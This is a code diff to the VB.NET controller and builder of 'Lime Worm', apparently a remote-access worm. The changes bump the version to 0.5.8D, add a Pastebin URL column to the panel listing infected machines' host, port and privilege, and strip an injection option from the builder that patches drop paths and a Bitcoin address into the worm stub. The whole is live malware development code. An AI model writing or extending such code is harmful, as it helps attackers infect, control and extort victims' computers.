@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./09/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./10/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                    .. Lime Worm v0.5.8C ..                   ##
+'##                    .. Lime Worm v0.5.8D ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -129,7 +129,7 @@ re:
 
         ContextMenuStrip1.Renderer = New MyRenderer()
 
-        Me.Text = "Lime Worm v0.5.8C"
+        Me.Text = "Lime Worm v0.5.8D"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -139,7 +139,6 @@ re:
         PATH1.Enabled = False
         DROP.Checked = False
         PATH2.Enabled = False
-        Injection_CHK.Enabled = False
 
         Dim Client As TcpClient = Nothing
         Try
@@ -159,7 +158,7 @@ re:
             ToolStripStatusLabel3.ForeColor = Color.Red
             Messages("{ Established! }", "But port " & MYPORT & " seems to be blocked")
         Finally
-            Client.Close()
+            Try : Client.Close() : Catch : End Try
         End Try
 
     End Sub
@@ -487,7 +486,7 @@ re:
                         .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
                         .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))
 
-
+                        .Add(New ListViewItem("Pastebin URL: ", GL)).SubItems.Add(A(24))
                         .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                         .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
                         .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
@@ -1284,12 +1283,6 @@ re:
                                                 If (str = "%PATH2%") Then
                                                     current.Operand = PATH2.Text
                                                 End If
-                                                If (str = "%INJ_NAME%") Then
-                                                    current.Operand = Injection_Name.Text
-                                                End If
-                                                If (str = "%INJ_CHK%") Then
-                                                    current.Operand = Injection_CHK.Checked.ToString
-                                                End If
                                                 If (str = "%BTC_ADDR%") Then
                                                     current.Operand = BTC_ADDR.Text
                                                 End If
@@ -1337,13 +1330,10 @@ re:
             EXE.Enabled = True
             PATH1.Enabled = True
             PATH2.Enabled = True
-            Injection_CHK.Enabled = True
         Else
             EXE.Enabled = False
             PATH1.Enabled = False
             PATH2.Enabled = False
-            Injection_CHK.Enabled = False
-            Injection_CHK.Checked = False
         End If
     End Sub
 
@@ -1384,20 +1374,6 @@ re:
             End If
         End If
     End Sub
-
-
-    'Private Sub Injection_CHK_Click(sender As Object, e As EventArgs) Handles Injection_CHK.Click
-    '   If Injection_CHK.Checked Then
-    '      USB_CHK.Enabled = False
-    '      PIN_CHK.Enabled = False
-    '      USB_CHK.Checked = False
-    '      PIN_CHK.Checked = False
-    '   Else
-    '     USB_CHK.Enabled = True
-    '      PIN_CHK.Enabled = True
-    'End If
-    'End Sub
-
 
 
 
